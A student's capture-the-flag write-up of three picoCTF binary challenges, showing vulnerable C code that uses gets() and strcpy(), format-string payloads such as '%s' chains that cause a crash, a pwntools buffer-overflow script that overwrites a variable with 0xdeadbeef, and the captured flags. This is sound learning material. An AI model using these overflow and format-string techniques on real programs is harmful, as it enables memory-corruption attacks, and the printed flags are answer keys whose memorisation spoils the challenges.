# 1. Buffer Overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Connect using: nc saturn.picoctf.net 56890

## Solution:

Looking at vuln.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

We can see the program takes in an input, and calls the `vuln` function. It also sets up a signal handler, so that in the case of a crash, the program can exit gracefully. Here, it handles SIGSEGV, which happens in the case of a segmentation fault. As I quite painfully learnt from PPS Lab, seg faults can most easily be created by going out of bounds in an array. This happens because the program tries to access memory that it is not allowed to. The kernel of your OS keeps track of all memory allocated to each program. In the vuln function, the input string is being copied into a buffer of 16 bytes, and by giving a string thats more than 16 characters in length, we can create a buffer overflow. The reason that this is even happening is because the string is being inputted with gets(), which does not perform out of bounds checking. Contrary to what we learn in PPS, the ideal way to input strings is using the fgets() function.

```
nc saturn.picoctf.net 56890
Input: ueh08gfy 0817398598y8y98y19835
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:

- Already knew about buffer overflows, so this was a helpful revision :)

## Notes:

- None

## Resources:

- None


***

# 2. Format String 0

> Can you use your knowledge of format strings to make the customers happy? Download the binary [here](https://artifacts.picoctf.net/c_mimas/78/format-string-0). Download the source [here](https://artifacts.picoctf.net/c_mimas/78/format-string-0.c).

## Solution:

Looking at `format-string-0.c`, the first thing we see is the signal handler, for which if and when the code segfaults, it prints the flag and exits. Moving on to the main function, it reads the flag from `flag.txt` and stores it into the `flag` string. 

It then moves on to the serve_patrick() function. The function defines a list of choices (menu) and takes in user input. Then it checks if the user input matches an option in the menu. Then it also checks if the length of the input for greater than `2 * BUFSIZE`, i.e. greater than 64. Considering that our input must match one of the items on the menu, we look for an item that has the correct format specifier that can help us satisfy the second requirement.
`Gr%114d_Cheese` works because it interprets `%114d` as a format specifier for an integer that must contain 114 digits.

It then moves on to the serve_bob() function. This function also defines a list of choices (menu) and takes in user input. It also checks if the user input matches an item in the menu. We must choose the correct option that will lead to a segfault.
`Cla%sic_Che%s%steak` works because it contains multiple `%s` that attempts to read pointer values from the stack (since no other arguments have been provided to it). Then it attempts to dereference that pointer which leads to a segfault.

```
nc mimas.picoctf.net 58434
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

## Concepts learnt:

- Format specifier attacks.

## Notes:

- Initially thought I had to craft my own inputs with custom format specifiers, then read through the code properly and realized you must use one of the options on the menu.

## Resources:

- https://owasp.org/www-community/attacks/Format_string_attack#
- https://cs155.stanford.edu/papers/formatstring-1.2.pdf


***

# 3. Clutter Overflow

> Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`

## Solution:

We are given a binary that takes in an input, puts it into a string variable `clutter`. Then it checks if the variable `code` is equal to a `0xdeadbeef`. If it is, it will print the flag. We must somehow change the data in `code` when inputting data into `clutter`. This is possible because the program uses `gets()` with no out of bounds checking.

Looking at the size of the `clutter` string, it is for 256 bytes, so I thought by inputting 256 chars of a random character (say `.`), we could buffer overflow into the `code` variable. Turns out that `256` was not the correct number of characters needed, it was `264`. I found this out by randomly spamming more than needed characters and eliminating until code become `0x00` once again. I'm sure there's a better way to find this limit.

Since code starts being updated from the 265th character onwards in the reverse order, we can input 264 random characters, then the ascii characters corresponding to hex values `ef`, `be`, `ad`, `de` (since they go in the reverse order). Note that these must be converted into bytes, and not inputted as actual ASCII text.

Script for doing so:
```python
from pwn import remote

hex_str = "deadbeef"
res = bytes.fromhex(hex_str)[::-1]
res = b'.' * 264 + res

conn = remote('mars.picoctf.net', 31890)  
print(conn.recv(timeout=1).decode())
conn.sendline(res)
response = conn.recvall()
print(response.decode())
conn.close()
```

```console
[+] Opening connection to mars.picoctf.net on port 31890: Done
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?

[+] Receiving all data: Done (113B)
[*] Closed connection to mars.picoctf.net port 31890
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Notes:
- Spent a lot of time trying to input the bytes from the terminal directly, but doing it in a python script was way easier.

## Resources:
None.